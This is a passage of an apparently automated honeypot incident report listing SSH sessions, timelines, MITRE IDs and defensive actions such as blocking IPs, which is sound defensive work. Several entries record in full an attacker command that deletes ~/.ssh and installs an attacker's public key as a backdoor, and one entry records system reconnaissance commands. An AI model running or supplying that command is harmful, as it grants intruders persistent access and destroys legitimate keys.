| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:35:18` | `cowrie.session.connect` |
| `2026-06-04 10:35:18` | `cowrie.client.version` |
| `2026-06-04 10:35:18` | `cowrie.client.kex` |
| `2026-06-04 10:35:19` | `cowrie.login.success` |
| `2026-06-04 10:35:20` | `cowrie.session.params` |
| `2026-06-04 10:35:20` | `cowrie.command.input` |
| `2026-06-04 10:35:20` | `cowrie.command.failed` |
| `2026-06-04 10:35:20` | `cowrie.log.closed` |
| `2026-06-04 10:35:21` | `cowrie.session.params` |
| `2026-06-04 10:35:21` | `cowrie.command.input` |
| `2026-06-04 10:35:21` | `cowrie.session.file_download` |
| `2026-06-04 10:35:21` | `cowrie.log.closed` |
| `2026-06-04 10:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00168b6299c

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:35 |
| **Last Seen** | 2026-06-04 10:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:35:25` | `cowrie.session.connect` |
| `2026-06-04 10:35:25` | `cowrie.client.version` |
| `2026-06-04 10:35:26` | `cowrie.client.kex` |
| `2026-06-04 10:35:27` | `cowrie.login.success` |
| `2026-06-04 10:35:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c8168c3d35

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:37 |
| **Last Seen** | 2026-06-04 10:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:37:39` | `cowrie.session.connect` |
| `2026-06-04 10:37:39` | `cowrie.client.version` |
| `2026-06-04 10:37:39` | `cowrie.client.kex` |
| `2026-06-04 10:37:40` | `cowrie.login.success` |
| `2026-06-04 10:37:40` | `cowrie.session.params` |
| `2026-06-04 10:37:40` | `cowrie.command.input` |
| `2026-06-04 10:37:40` | `cowrie.command.failed` |
| `2026-06-04 10:37:41` | `cowrie.log.closed` |
| `2026-06-04 10:37:41` | `cowrie.session.params` |
| `2026-06-04 10:37:41` | `cowrie.command.input` |
| `2026-06-04 10:37:41` | `cowrie.session.file_download` |
| `2026-06-04 10:37:41` | `cowrie.log.closed` |
| `2026-06-04 10:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f167b8ec817

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:37 |
| **Last Seen** | 2026-06-04 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:37:43` | `cowrie.session.connect` |
| `2026-06-04 10:37:43` | `cowrie.client.version` |
| `2026-06-04 10:37:44` | `cowrie.client.kex` |
| `2026-06-04 10:37:44` | `cowrie.login.success` |
| `2026-06-04 10:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-244e6012a558

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:37 |
| **Last Seen** | 2026-06-04 10:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:37:58` | `cowrie.session.connect` |
| `2026-06-04 10:37:58` | `cowrie.client.version` |
| `2026-06-04 10:37:58` | `cowrie.client.kex` |
| `2026-06-04 10:38:00` | `cowrie.login.success` |
| `2026-06-04 10:38:00` | `cowrie.session.params` |
| `2026-06-04 10:38:00` | `cowrie.command.input` |
| `2026-06-04 10:38:00` | `cowrie.command.failed` |
| `2026-06-04 10:38:01` | `cowrie.log.closed` |
| `2026-06-04 10:38:02` | `cowrie.session.params` |
| `2026-06-04 10:38:02` | `cowrie.command.input` |
| `2026-06-04 10:38:02` | `cowrie.session.file_download` |
| `2026-06-04 10:38:02` | `cowrie.log.closed` |
| `2026-06-04 10:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3688e1d8f5

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:38 |
| **Last Seen** | 2026-06-04 10:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:38:06` | `cowrie.session.connect` |
| `2026-06-04 10:38:06` | `cowrie.client.version` |
| `2026-06-04 10:38:06` | `cowrie.client.kex` |
| `2026-06-04 10:38:07` | `cowrie.login.success` |
| `2026-06-04 10:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7b446ec1904

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:40 |
| **Last Seen** | 2026-06-04 10:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:40:33` | `cowrie.session.connect` |
| `2026-06-04 10:40:33` | `cowrie.client.version` |
| `2026-06-04 10:40:33` | `cowrie.client.kex` |
| `2026-06-04 10:40:34` | `cowrie.login.success` |
| `2026-06-04 10:40:35` | `cowrie.session.params` |
| `2026-06-04 10:40:35` | `cowrie.command.input` |
| `2026-06-04 10:40:35` | `cowrie.command.failed` |
| `2026-06-04 10:40:35` | `cowrie.log.closed` |
| `2026-06-04 10:40:36` | `cowrie.session.params` |
| `2026-06-04 10:40:36` | `cowrie.command.input` |
| `2026-06-04 10:40:37` | `cowrie.session.file_download` |
| `2026-06-04 10:40:37` | `cowrie.log.closed` |
| `2026-06-04 10:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a144f13fcb81

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:40 |
| **Last Seen** | 2026-06-04 10:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:40:40` | `cowrie.session.connect` |
| `2026-06-04 10:40:40` | `cowrie.client.version` |
| `2026-06-04 10:40:41` | `cowrie.client.kex` |
| `2026-06-04 10:40:42` | `cowrie.login.success` |
| `2026-06-04 10:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467de9d8b742

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:48 |
| **Last Seen** | 2026-06-04 10:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:48:23` | `cowrie.session.connect` |
| `2026-06-04 10:48:23` | `cowrie.client.version` |
| `2026-06-04 10:48:24` | `cowrie.client.kex` |
| `2026-06-04 10:48:25` | `cowrie.login.success` |
| `2026-06-04 10:48:26` | `cowrie.session.params` |
| `2026-06-04 10:48:26` | `cowrie.command.input` |
| `2026-06-04 10:48:26` | `cowrie.command.failed` |
| `2026-06-04 10:48:26` | `cowrie.log.closed` |
| `2026-06-04 10:48:27` | `cowrie.session.params` |
| `2026-06-04 10:48:27` | `cowrie.command.input` |
| `2026-06-04 10:48:27` | `cowrie.session.file_download` |
| `2026-06-04 10:48:27` | `cowrie.log.closed` |
| `2026-06-04 10:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cada8112fc8

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:48 |
| **Last Seen** | 2026-06-04 10:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:48:31` | `cowrie.session.connect` |
| `2026-06-04 10:48:31` | `cowrie.client.version` |
| `2026-06-04 10:48:31` | `cowrie.client.kex` |
| `2026-06-04 10:48:33` | `cowrie.login.success` |
| `2026-06-04 10:48:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e96d35eb8c0

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:03 |
| **Last Seen** | 2026-06-04 11:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:03:58` | `cowrie.session.connect` |
| `2026-06-04 11:03:58` | `cowrie.client.version` |
| `2026-06-04 11:03:58` | `cowrie.client.kex` |
| `2026-06-04 11:04:00` | `cowrie.login.success` |
| `2026-06-04 11:04:01` | `cowrie.session.params` |
| `2026-06-04 11:04:01` | `cowrie.command.input` |
| `2026-06-04 11:04:01` | `cowrie.command.failed` |
| `2026-06-04 11:04:01` | `cowrie.log.closed` |
| `2026-06-04 11:04:02` | `cowrie.session.params` |
| `2026-06-04 11:04:02` | `cowrie.command.input` |
| `2026-06-04 11:04:02` | `cowrie.session.file_download` |
| `2026-06-04 11:04:02` | `cowrie.log.closed` |
| `2026-06-04 11:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a23fcec939

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:04 |
| **Last Seen** | 2026-06-04 11:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:04:06` | `cowrie.session.connect` |
| `2026-06-04 11:04:06` | `cowrie.client.version` |
| `2026-06-04 11:04:06` | `cowrie.client.kex` |
| `2026-06-04 11:04:07` | `cowrie.login.success` |
| `2026-06-04 11:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf49df6bbeda

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:09 |
| **Last Seen** | 2026-06-04 11:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:09:09` | `cowrie.session.connect` |
| `2026-06-04 11:09:09` | `cowrie.client.version` |
| `2026-06-04 11:09:09` | `cowrie.client.kex` |
| `2026-06-04 11:09:10` | `cowrie.login.success` |
| `2026-06-04 11:09:11` | `cowrie.session.params` |
| `2026-06-04 11:09:11` | `cowrie.command.input` |
| `2026-06-04 11:09:11` | `cowrie.command.failed` |
| `2026-06-04 11:09:12` | `cowrie.log.closed` |
| `2026-06-04 11:09:12` | `cowrie.session.params` |
| `2026-06-04 11:09:12` | `cowrie.command.input` |
| `2026-06-04 11:09:13` | `cowrie.session.file_download` |
| `2026-06-04 11:09:13` | `cowrie.log.closed` |
| `2026-06-04 11:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb4e9077bdc

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:09 |
| **Last Seen** | 2026-06-04 11:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:09:16` | `cowrie.session.connect` |
| `2026-06-04 11:09:16` | `cowrie.client.version` |
| `2026-06-04 11:09:17` | `cowrie.client.kex` |
| `2026-06-04 11:09:18` | `cowrie.login.success` |
| `2026-06-04 11:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1c81c254da1

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:17 |
| **Last Seen** | 2026-06-04 11:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:17:08` | `cowrie.session.connect` |
| `2026-06-04 11:17:08` | `cowrie.client.version` |
| `2026-06-04 11:17:08` | `cowrie.client.kex` |
| `2026-06-04 11:17:09` | `cowrie.login.success` |
| `2026-06-04 11:17:10` | `cowrie.session.params` |
| `2026-06-04 11:17:10` | `cowrie.command.input` |
| `2026-06-04 11:17:10` | `cowrie.command.failed` |
| `2026-06-04 11:17:10` | `cowrie.log.closed` |
| `2026-06-04 11:17:11` | `cowrie.session.params` |
| `2026-06-04 11:17:11` | `cowrie.command.input` |
| `2026-06-04 11:17:12` | `cowrie.session.file_download` |
| `2026-06-04 11:17:12` | `cowrie.log.closed` |
| `2026-06-04 11:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e99fb2dc27f

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 11:17 |
| **Last Seen** | 2026-06-04 11:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:17:15` | `cowrie.session.connect` |
| `2026-06-04 11:17:15` | `cowrie.client.version` |
| `2026-06-04 11:17:16` | `cowrie.client.kex` |
| `2026-06-04 11:17:17` | `cowrie.login.success` |
| `2026-06-04 11:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd71bd91f54

| Field | Detail |
|---|---|
| **Source IP** | `59.27.249[.]238` |
| **First Seen** | 2026-06-04 11:18 |
| **Last Seen** | 2026-06-04 11:21 |
| **Session Duration** | 191s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 11:18:08` | `cowrie.session.connect` |
| `2026-06-04 11:18:08` | `cowrie.client.version` |
| `2026-06-04 11:18:09` | `cowrie.client.kex` |
| `2026-06-04 11:18:16` | `cowrie.login.failed` |
| `2026-06-04 11:18:18` | `cowrie.login.success` |
| `2026-06-04 11:18:20` | `cowrie.session.params` |
| `2026-06-04 11:18:20` | `cowrie.command.input` |
| `2026-06-04 11:18:20` | `cowrie.command.failed` |
| `2026-06-04 11:18:22` | `cowrie.log.closed` |
| `2026-06-04 11:18:24` | `cowrie.session.params` |
| `2026-06-04 11:18:24` | `cowrie.command.input` |
| `2026-06-04 11:18:26` | `cowrie.log.closed` |
| `2026-06-04 11:18:28` | `cowrie.session.params` |
| `2026-06-04 11:18:28` | `cowrie.command.input` |
| `2026-06-04 11:18:30` | `cowrie.log.closed` |
| `2026-06-04 11:18:32` | `cowrie.session.params` |
| `2026-06-04 11:18:32` | `cowrie.command.input` |
| `2026-06-04 11:18:33` | `cowrie.log.closed` |
| `2026-06-04 11:18:36` | `cowrie.session.params` |
| `2026-06-04 11:18:36` | `cowrie.command.input` |
| `2026-06-04 11:18:37` | `cowrie.log.closed` |
| `2026-06-04 11:18:40` | `cowrie.session.params` |
| `2026-06-04 11:18:40` | `cowrie.command.input` |
| `2026-06-04 11:18:41` | `cowrie.log.closed` |
